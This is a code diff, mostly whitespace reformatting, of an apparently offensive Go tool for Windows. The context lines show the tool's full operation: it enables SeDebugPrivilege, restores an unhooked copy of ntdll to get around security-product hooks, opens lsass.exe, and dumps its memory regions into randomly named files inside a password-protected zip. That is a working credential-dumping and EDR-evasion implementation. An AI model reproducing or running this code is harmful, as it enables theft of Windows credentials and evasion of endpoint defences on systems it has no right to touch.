@@ -2,11 +2,11 @@ package main
 
 
 import (
-	"os"
-	"fmt"
-	"flag"
-	"unsafe"
-	"syscall"
+    "os"
+    "fmt"
+    "flag"
+    "unsafe"
+    "syscall"
     "math/big"
     "github.com/alexmullins/zip" //"archive/zip"
     "crypto/rand"
@@ -16,17 +16,17 @@ import (
 )
 
 const (
-	MAXIMUM_ALLOWED uintptr = 0x02000000
-	PROCESS_QUERY_INFORMATION uintptr = 0x0400
-	PROCESS_VM_READ uintptr = 0x0010
-	SE_PRIVILEGE_ENABLED = 0x00000002
-	TOKEN_ADJUST_PRIVILEGES = 0x0020
-	TOKEN_QUERY = 0x0008
-	ProcessBasicInformation uintptr = 0x00
-	PAGE_NOACCESS uint32 = 0x01
-	MEM_COMMIT uint32 = 0x00001000
-	letters = "abcdefghijklmnopqrstuvwxyz"
-	ldr_offset uintptr = 0x18
+    MAXIMUM_ALLOWED uintptr = 0x02000000
+    PROCESS_QUERY_INFORMATION uintptr = 0x0400
+    PROCESS_VM_READ uintptr = 0x0010
+    SE_PRIVILEGE_ENABLED = 0x00000002
+    TOKEN_ADJUST_PRIVILEGES = 0x0020
+    TOKEN_QUERY = 0x0008
+    ProcessBasicInformation uintptr = 0x00
+    PAGE_NOACCESS uint32 = 0x01
+    MEM_COMMIT uint32 = 0x00001000
+    letters = "abcdefghijklmnopqrstuvwxyz"
+    ldr_offset uintptr = 0x18
     inInitializationOrderModuleList_offset uintptr = 0x30
     flink_dllbase_offset uintptr = 0x20
     flink_buffer_offset uintptr = 0x50
@@ -40,16 +40,16 @@ const (
 )
 
 var (
-	ntGetNextProcess *windows.LazyProc
-	ntOpenProcess *windows.LazyProc
-	ntQueryInformationProcess *windows.LazyProc
-	ntReadVirtualMemory *windows.LazyProc
-	ntQueryVirtualMemory *windows.LazyProc
-	ntOpenProcessToken *windows.LazyProc
-	ntAdjustPrivilegesToken *windows.LazyProc
-	ntClose *windows.LazyProc
+    ntGetNextProcess *windows.LazyProc
+    ntOpenProcess *windows.LazyProc
+    ntQueryInformationProcess *windows.LazyProc
+    ntReadVirtualMemory *windows.LazyProc
+    ntQueryVirtualMemory *windows.LazyProc
+    ntOpenProcessToken *windows.LazyProc
+    ntAdjustPrivilegesToken *windows.LazyProc
+    ntClose *windows.LazyProc
 
-	VirtualProtect *windows.LazyProc
+    VirtualProtect *windows.LazyProc
     createFile *windows.LazyProc
     createFileMapping *windows.LazyProc
     mapViewOfFile *windows.LazyProc
@@ -62,48 +62,48 @@ var (
 
 // Structures
 type CLIENT_ID struct {
-	UniqueProcess uintptr
-	UniqueThread  uintptr
+    UniqueProcess uintptr
+    UniqueThread  uintptr
 }
 
 type LUID struct {
-	LowPart  uint32
-	HighPart int32
+    LowPart  uint32
+    HighPart int32
 }
 
 type TOKEN_PRIVILEGES struct {
-	PrivilegeCount uint32
-	Privileges     [1]LUID_AND_ATTRIBUTES
+    PrivilegeCount uint32
+    Privileges     [1]LUID_AND_ATTRIBUTES
 }
 
 type LUID_AND_ATTRIBUTES struct {
-	Luid       LUID
-	Attributes uint32
+    Luid       LUID
+    Attributes uint32
 }
 
 type PROCESS_BASIC_INFORMATION struct {
-	ExitStatus                   uint32
-	PebBaseAddress               uintptr
-	AffinityMask                 uintptr
-	BasePriority                 int32
-	UniqueProcessID              uintptr
-	InheritedFromUniqueProcessID uintptr
+    ExitStatus                   uint32
+    PebBaseAddress               uintptr
+    AffinityMask                 uintptr
+    BasePriority                 int32
+    UniqueProcessID              uintptr
+    InheritedFromUniqueProcessID uintptr
 }
 
 type MEMORY_BASIC_INFORMATION struct {
-	BaseAddress       uintptr
-	AllocationBase    uintptr
-	AllocationProtect uint32
-	RegionSize        uintptr
-	State             uint32
-	Protect           uint32
-	Type              uint32
+    BaseAddress       uintptr
+    AllocationBase    uintptr
+    AllocationProtect uint32
+    RegionSize        uintptr
+    State             uint32
+    Protect           uint32
+    Type              uint32
 }
 
 type Mem64Information struct {
-	Field0	string `json:"field0"`
-	Field1	string    `json:"field1"`
-	Field2  uint32 `json:"field2"`
+    Field0	string `json:"field0"`
+    Field1	string    `json:"field1"`
+    Field2  uint32 `json:"field2"`
 }
 
 type MemFile struct {
@@ -156,19 +156,19 @@ type PROCESS_INFORMATION struct {
 
 
 func init() {
-	// ntdll
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	ntGetNextProcess = ntdll.NewProc("NtGetNextProcess")
-	ntQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
-	ntOpenProcess = ntdll.NewProc("NtOpenProcess")
-	ntReadVirtualMemory = ntdll.NewProc("NtReadVirtualMemory")
-	ntQueryVirtualMemory = ntdll.NewProc("NtQueryVirtualMemory")
-	ntOpenProcessToken = ntdll.NewProc("NtOpenProcessToken")
-	ntAdjustPrivilegesToken = ntdll.NewProc("NtAdjustPrivilegesToken")
-	ntClose = ntdll.NewProc("NtClose")
-	ntOpenSection = ntdll.NewProc("NtOpenSection")
-	// kernel32
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+    // ntdll
+    ntdll := windows.NewLazySystemDLL("ntdll.dll")
+    ntGetNextProcess = ntdll.NewProc("NtGetNextProcess")
+    ntQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
+    ntOpenProcess = ntdll.NewProc("NtOpenProcess")
+    ntReadVirtualMemory = ntdll.NewProc("NtReadVirtualMemory")
+    ntQueryVirtualMemory = ntdll.NewProc("NtQueryVirtualMemory")
+    ntOpenProcessToken = ntdll.NewProc("NtOpenProcessToken")
+    ntAdjustPrivilegesToken = ntdll.NewProc("NtAdjustPrivilegesToken")
+    ntClose = ntdll.NewProc("NtClose")
+    ntOpenSection = ntdll.NewProc("NtOpenSection")
+    // kernel32
+    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
     VirtualProtect = kernel32.NewProc("VirtualProtect")
     createFile = kernel32.NewProc("CreateFileA")
     createFileMapping = kernel32.NewProc("CreateFileMappingA")
@@ -193,7 +193,7 @@ func GetProcNameFromHandle(proc_handle uintptr) (string){
     // Get PEB->ProcessParameters
     processparameters_pointer := peb_addr + uintptr(processparameters_offset)
     processparameters_adress := read_remoteintptr(proc_handle, processparameters_pointer, 8)
-    
+
     // Get ProcessParameters->CommandLine
     commandline_pointer := processparameters_adress + uintptr(commandline_offset)
     commandline_address := read_remoteintptr(proc_handle, commandline_pointer, 8)
@@ -219,51 +219,51 @@ func GetProcessByName(process_name string) uintptr{
 
 
 func enable_SeDebugPrivilege() bool {
-	pid := uintptr(syscall.Getpid())
-	hProcess := open_process(pid)
+    pid := uintptr(syscall.Getpid())
+    hProcess := open_process(pid)
 
-	// NtOpenProcessToken
-	var tokenHandle syscall.Token
-	ntstatus, _, _ := ntOpenProcessToken.Call(uintptr(hProcess), uintptr(TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), uintptr(unsafe.Pointer(&tokenHandle)))
-	if ntstatus != 0 {
-		fmt.Printf("[-] NtOpenProcessToken error status: 0x%x\n", ntstatus)
-		return false
-	}
-	luid := LUID{ LowPart:  20, HighPart: 0,}
-	tp := TOKEN_PRIVILEGES{
-		PrivilegeCount: 1,
-		Privileges: [1]LUID_AND_ATTRIBUTES{ { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED, }, },
-	}
+    // NtOpenProcessToken
+    var tokenHandle syscall.Token
+    ntstatus, _, _ := ntOpenProcessToken.Call(uintptr(hProcess), uintptr(TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), uintptr(unsafe.Pointer(&tokenHandle)))
+    if ntstatus != 0 {
+        fmt.Printf("[-] NtOpenProcessToken error status: 0x%x\n", ntstatus)
+        return false
+    }
+    luid := LUID{ LowPart:  20, HighPart: 0,}
+    tp := TOKEN_PRIVILEGES{
+        PrivilegeCount: 1,
+        Privileges: [1]LUID_AND_ATTRIBUTES{ { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED, }, },
+    }
 
-	// NtAdjustPrivilegesToken
-	ntstatus, _, _ = ntAdjustPrivilegesToken.Call(uintptr(tokenHandle), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
-	if ntstatus != 0 {
-		fmt.Printf("[-] NtAdjustPrivilegesToken error status: 0x%x\n", ntstatus)
-		return false
-	}
+    // NtAdjustPrivilegesToken
+    ntstatus, _, _ = ntAdjustPrivilegesToken.Call(uintptr(tokenHandle), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
+    if ntstatus != 0 {
+        fmt.Printf("[-] NtAdjustPrivilegesToken error status: 0x%x\n", ntstatus)
+        return false
+    }
 
-	// NtClose
-	ntstatus, _, _ = ntClose.Call(uintptr(tokenHandle))
-	if ntstatus != 0 {
-		fmt.Printf("[-] NtClose error status: 0x%x\n", ntstatus)
-		return false
-	}
+    // NtClose
+    ntstatus, _, _ = ntClose.Call(uintptr(tokenHandle))
+    if ntstatus != 0 {
+        fmt.Printf("[-] NtClose error status: 0x%x\n", ntstatus)
+        return false
+    }
 
-	return true
+    return true
 }
 
 
 func open_process(pid uintptr) uintptr {
-	var handle uintptr
-	objectAttributes := OBJECT_ATTRIBUTES{}
-	clientId := CLIENT_ID{UniqueProcess: pid}
+    var handle uintptr
+    objectAttributes := OBJECT_ATTRIBUTES{}
+    clientId := CLIENT_ID{UniqueProcess: pid}
 
-	status, _, _ := ntOpenProcess.Call(uintptr(unsafe.Pointer(&handle)), PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&clientId)))
-	if (status != 0) {
-		fmt.Printf("[-] Failed to open process. NTSTATUS: 0x%X\n", status)
-		return 0
-	}
-	return handle
+    status, _, _ := ntOpenProcess.Call(uintptr(unsafe.Pointer(&handle)), PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&clientId)))
+    if (status != 0) {
+        fmt.Printf("[-] Failed to open process. NTSTATUS: 0x%X\n", status)
+        return 0
+    }
+    return handle
 }
 
 
@@ -342,7 +342,7 @@ func get_local_lib_address(dll_name string) uintptr {
     ldr_address := read_remoteintptr(process_handle, ldr_pointer, 8)
     // fmt.Printf("[+] ldr_pointer: \t0x%x\n", ldr_pointer)
     // fmt.Printf("[+] Ldr Address: \t0x%x\n", ldr_address)
-    
+
     // next_flink
     InInitializationOrderModuleList:= ldr_address + inInitializationOrderModuleList_offset
     next_flink := read_remoteintptr(process_handle, InInitializationOrderModuleList, 8)
@@ -382,7 +382,7 @@ func get_section_info(base_address uintptr) (uintptr,uintptr) {
 
 
 func replace_ntdll_section(unhooked_ntdll_text uintptr, local_ntdll_txt uintptr, local_ntdll_txt_size uintptr){
-	fmt.Printf("[+] Copying %d bytes from 0x%s to 0x%s\n", local_ntdll_txt_size, fmt.Sprintf("%x", unhooked_ntdll_text), fmt.Sprintf("%x", local_ntdll_txt))
+    fmt.Printf("[+] Copying %d bytes from 0x%s to 0x%s\n", local_ntdll_txt_size, fmt.Sprintf("%x", unhooked_ntdll_text), fmt.Sprintf("%x", local_ntdll_txt))
 
     var oldProtect uintptr
     res, _, _ := VirtualProtect.Call(local_ntdll_txt, local_ntdll_txt_size, PAGE_EXECUTE_WRITECOPY, uintptr(unsafe.Pointer(&oldProtect)))
@@ -437,7 +437,7 @@ func overwrite_disk(file_name string) uintptr {
     // CloseHandle
     windows.CloseHandle(windows.Handle(file_handle))
     windows.CloseHandle(windows.Handle(mapping_handle))
-    
+
     // Add Offset
     var unhooked_ntdll_text uintptr = unhooked_ntdll + offset_mappeddll
     return unhooked_ntdll_text
@@ -476,7 +476,7 @@ func overwrite_knowndlls() uintptr {
 
     // CloseHandle
     windows.CloseHandle(windows.Handle(section_handle))
-    
+
     // Add offset
     var unhooked_ntdll_text uintptr = unhooked_ntdll + offset_mappeddll
     return unhooked_ntdll_text
@@ -495,7 +495,7 @@ func overwrite_debugproc(file_path string, local_ntdll_txt uintptr, local_ntdll_
         fmt.Printf("[-] CreateProcess failed: %v\n", err)
         os.Exit(0)
     }
-    
+
     // NtReadVirtualMemory: debugged_process ntdll_handle = local ntdll_handle --> debugged_process .text section ntdll_handle = local .text section ntdll_handle
     buffer := make([]byte, local_ntdll_txt_size)
     var bytesRead uintptr
@@ -522,7 +522,7 @@ func overwrite_debugproc(file_path string, local_ntdll_txt uintptr, local_ntdll_
 
 
 func overwrite(optionFlag string, pathFlag string){
-	var local_ntdll uintptr = get_local_lib_address("ntdll.dll")
+    var local_ntdll uintptr = get_local_lib_address("ntdll.dll")
     // fmt.Printf("[+] Local Ntdll:\t0x%s\n", fmt.Sprintf("%x", local_ntdll))
     local_ntdll_txt_addr, local_ntdll_txt_size := get_section_info(local_ntdll)
     // fmt.Printf("[+] Local Ntdll Size:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt_size))
@@ -640,16 +640,16 @@ func writeJson(json_file string, mem64list_arr []Mem64Information) {
 
 
 func main() {
-	// Ntdll overwrite options
-	var optionFlagStr string
-	var pathFlagStr string
+    // Ntdll overwrite options
+    var optionFlagStr string
+    var pathFlagStr string
     var zipPasswordStr string
     flag.StringVar(&optionFlagStr,  "o",  "default", "Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"")
     flag.StringVar(&pathFlagStr,    "p",  "default", "Path to ntdll file in disk (for \"disk\" option) or program to open in debug mode (\"debugproc\" option)")
     flag.StringVar(&zipPasswordStr, "zp", "",        "Password for zip file")
     flag.Parse()
     if (optionFlagStr != "default") {
-    	overwrite(optionFlagStr, pathFlagStr)
+        overwrite(optionFlagStr, pathFlagStr)
     }
 
     // Get SeDebugPrivilege
@@ -664,7 +664,7 @@ func main() {
     process_name := "C:\\WINDOWS\\system32\\lsass.exe"
     proc_handle := GetProcessByName(process_name)
     fmt.Printf("[+] Process Handle: \t%d\n", proc_handle)
-    
+
     // Loop modules
     mem64list_arr := []Mem64Information{}
     var mem_address uintptr = 0
@@ -685,7 +685,7 @@ func main() {
             ntReadVirtualMemory.Call(proc_handle, memInfo.BaseAddress, uintptr(unsafe.Pointer(&buffer[0])), memInfo.RegionSize, uintptr(unsafe.Pointer(&bytesRead)))
             // Random name
             memdump_filename := randomString(9) + "." + randomString(3) //fmt.Sprintf("%x", (memInfo.BaseAddress))
-            
+
             // Write binary file
             memfile := MemFile{ Filename: memdump_filename, Content: buffer}
             memFile_arr = append(memFile_arr, memfile)
